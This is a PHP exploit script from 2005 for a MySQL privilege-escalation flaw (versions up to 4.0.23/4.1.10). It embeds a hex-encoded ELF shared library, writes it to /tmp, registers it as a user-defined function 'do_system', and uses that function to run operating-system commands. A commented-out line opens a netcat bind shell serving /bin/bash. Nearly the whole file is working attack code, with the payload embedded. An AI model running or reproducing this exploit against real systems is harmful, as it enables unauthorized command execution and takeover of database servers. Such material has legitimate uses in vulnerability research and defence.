<?
/*************************************
**  Mysql CREATE FUNCTION func table arbitrary library injection
**
**  Author: Stefano Di Paola
**  Vulnerable: Mysql <= 4.0.23, 4.1.10 
**  Type of Vulnerability: Local/Remote Privileges Escalation  - input validation
**  Tested On : Mandrake 10.1 /Debian Sarge
**  Vendor Status: Notified on March 2005
**
**  Copyright 2005 Stefano Di Paola (stefano.dipaola@wisec.it)
**
**  
** Disclaimer:
**  In no event shall the author be liable for any damages 
**  whatsoever arising out of or in connection with the use 
**  or spread of this information. 
**  Any use of this information is at the user's own risk.
**
**
*************************************
*/


// this is the MySql root password.
$pass='useyoupasswordhere';

function mysql_create_db($db,$link)
{
$query="CREATE database $db;";
 return  mysql_query($query, $link) ;
  
}
// the library in little endian hex. (from NGS's Hackproofing_MySql http://www.nextgenss.com/papers/HackproofingMySQL.pdf )
$solib="0x7f454c4601010100000000000000000003000300010000002006000034000000340a00000000000034002000040028001600150001000000000000000000000000000000940700009407000005000000001000000100000094070000941700009417000004010000080100000600000000100000020000009c0700009c1700009c170000c8000000c8000000060000000400000051e57464000000000000000000000000000000000000000006000000040000002500000028000000000000002600000000000000000000000000000000000000000000002200000027000000000000000000000000000000000000000000000000000000000000000000000000000000230000001e0000000000000000000000000000000000000000000000200000000000000000000000000000000000000021000000250000000000000000000000000000002400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c000000000000001f000000000000001d000000000000000000000000000000000000000000000000000000b4000000000000000300010000000000f001000000000000030002000000000070040000000000000300030000000000100500000000000003000400000000006005000000000000030005000000000090050000000000000300060000000000c0050000000000000300070000000000d0050000000000000300080000000000e8050000000000000300090000000000200600000000000003000a0000000000740700000000000003000b0000000000900700000000000003000c0000000000941700000000000003000d00000000009c1700000000000003000e0000000000641800000000000003000f00000000006c180000000000000300100000000000741800000000000003001100000000007818000000000000030012000000000098180000000000000300130000000000000000000000000003001400000000000000000000000000030015000000000000000000000000000300160000000000000000000000000003001700000000000000000000000000030018000000000000000000000000000300190000000000000000000000000003001a0000000000000000000000000003001b00010000009c170000000000001100f1ff610000000000000076000000120000002f000000d005000000000000120008007900000098180000000000001000f1ff35000000740700000000000012000b003b0000000000000097000000220000005e000000080700003600000012000a007200000098180000000000001000f1ff0a00000078180000000000001100f1ff850000009c180000000000001000f1ff4a00000000000000000000002000000020000000000000000000000020000000005f44594e414d4943005f474c4f42414c5f4f46465345545f5441424c455f005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c617373657300646f5f73797374656d006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000200010001000100030001000100010001000000000001000200680000001000000000000000731f6909000003008a000000100000001069690d000002009600000000000000941700000800000098170000080000002b070000021d00008c1800000621000090180000062600009418000006270000841800000721000088180000072600005589e583ec08e845000000e8e0000000e85b010000c9c300ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff00000000000000005589e553e8000000005b81c34f120000528b831c00000085c07402ffd0585bc9c39090909090909090909090909090905589e553e8000000005b81c31f1200005180bb200000000075348b931400000085d2752f8b8320ffffff8b1085d2741783c004898320ffffffffd28b8320ffffff8b1085d275e9c68320000000018b5dfcc9c383ec0c8b831cffffff50e846ffffff83c410ebbd89f68dbc27000000005589e553e8000000005b81c3af110000508b83fcffffff85c0740a8b831800000085c0750b8b5dfcc9c38db60000000083ec0c8d83fcffffff50e809ffffff83c4108b5dfcc9c3905589e583ec088b450c8338017409c745fc00000000eb1a83ec0c8b450c8b4008ff30e8fcffffff83c410c745fc000000008b45fcc9c390905589e55653e8000000005b81c32e1100008d83f0ffffff8d70fc8b40fc83f8ff740c83ee04ffd08b0683f8ff75f45b5e5dc390905589e553e8000000005b81c3fb10000050e8c6feffff595bc9c3000000000000941700007018000001000000680000000c000000d00500000d0000007407000004000000b4000000050000007004000006000000f00100000a000000a00000000b0000001000000003000000781800000200000010000000140000001100000017000000c00500001100000090050000120000003000000013000000080000001600000000000000feffff6f60050000ffffff6f01000000f0ffff6f10050000faffff6f0200000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff00000000000000009c1700000000000000000000fe0500000e060000000000000000000000000000004743433a2028474e552920332e332e3120284d616e6472616b65204c696e757820392e3220332e332e312d316d646b2900004743433a2028474e552920332e332e3120284d616e6472616b65204c696e757820392e3220332e332e312d326d646b2900004743433a2028474e552920332e332e3120284d616e6472616b65204c696e757820392e3220332e332e312d326d646b2900004743433a2028474e552920332e332e3120284d616e6472616b65204c696e757820392e3220332e332e312d326d646b2900004743433a2028474e552920332e332e3120284d616e6472616b65204c696e757820392e3220332e332e312d316d646b2900002e7368737472746162002e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e65685f6672616d65002e64617461002e64796e616d6963002e63746f7273002e64746f7273002e6a6372002e676f74002e627373002e636f6d6d656e74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b0000000500000002000000b4000000b40000003c01000002000000000000000400000004000000110000000b00000002000000f0010000f001000080020000030000001c00000004000000100000001900000003000000020000007004000070040000a00000000000000000000000010000000000000021000000ffffff6f02000000100500001005000050000000020000000000000002000000020000002e000000feffff6f02000000600500006005000030000000030000000100000004000000000000003d000000090000000200000090050000900500003000000002000000000000000400000008000000460000000900000002000000c0050000c005000010000000020000000900000004000000080000004f0000000100000006000000d0050000d005000017000000000000000000000004000000000000004a0000000100000006000000e8050000e80500003000000000000000000000000400000004000000550000000100000006000000200600002006000054010000000000000000000010000000000000005b000000010000000600000074070000740700001a00000000000000000000000400000000000000610000000100000002000000900700009007000004000000000000000000000004000000000000006b0000000100000003000000941700009407000008000000000000000000000004000000000000007100000006000000030000009c1700009c070000c8000000030000000000000004000000080000007a0000000100000003000000641800006408000008000000000000000000000004000000000000008100000001000000030000006c1800006c0800000800000000000000000000000400000000000000880000000100000003000000741800007408000004000000000000000000000004000000000000008d000000010000000300000078180000780800002000000000000000000000000400000004000000920000000800000003000000981800009808000004000000000000000000000004000000000000009700000001000000000000000000000098080000fa000000000000000000000001000000000000000100000003000000000000000000000092090000a000000000000000000000000100000000000000";


$link=mysql_connect("127.0.0.1","root",$pass);
if (!$link) {
   die('Could not connect: ' . mysql_error());
}
echo "Connected successfully as root\n";
echo "creating db for lib\n";
mysql_create_db('my_db',$link)  or print ('cannot create my_db db, sorry!');
echo "done....\n";
echo "selecting db for lib\n";
mysql_select_db('my_db') or print ('cannot use my_db db, sorry!');
echo "done....\n";

echo "creating blob table for lib\n";
$query="CREATE TABLE blob_tab (blob_col BLOB);";
$result = mysql_query($query, $link) or print("cannot  create blob table for lib\n");
echo "done....\n";

echo "inserting blob table for lib\n";
$query="INSERT into blob_tab values (CONVERT($solib,CHAR));";
$result = mysql_query($query, $link) or print("cannot  insert blob for lib\n");
echo "done....\n";

echo "dumping lib in /tmp/libso.so.0...\n";
$query="SELECT blob_col FROM blob_tab INTO DUMPFILE '/tmp/libso.so.0';";
$result = mysql_query($query, $link) or print("cannot  dump lib\n");
echo " done....\n";

mysql_select_db('mysql') or die ('cannot use mysql db, sorry!');
echo "sending lib....\n";

$query="insert into func (name,dl) values ('do_system','/tmp/libso.so.0');";
$result = mysql_query($query, $link);
echo "done....\n";
echo "Creating exit function to restart server\n";

$query="create function exit returns integer soname 'libc.so.6';";
$result = mysql_query($query, $link) or print ("cannot create exit, sorry!\n");
echo "done....\n";
echo "Selecting exit function\n";

$query="select exit();";
$result = mysql_query($query, $link);
echo "done!\nWaiting for server to restart\n";

sleep(1);

$link=mysql_connect("127.0.0.1","root",$pass);
if (!$link) {
   die('Could not connect: ' . mysql_error());
}
echo "Connected to MySql server again...\n";

//$cmd ='/usr/sbin/nc -l -p 8000 -e /bin/bash';
$cmd ='id >/tmp/id';
echo "Sending Command...$cmd\n";
$query="select do_system('$cmd');";
$result = mysql_query($query, $link);
echo "done!\n";
echo "Now use your fav shell and ls /tmp/id -l \n";
mysql_close($link);

?>
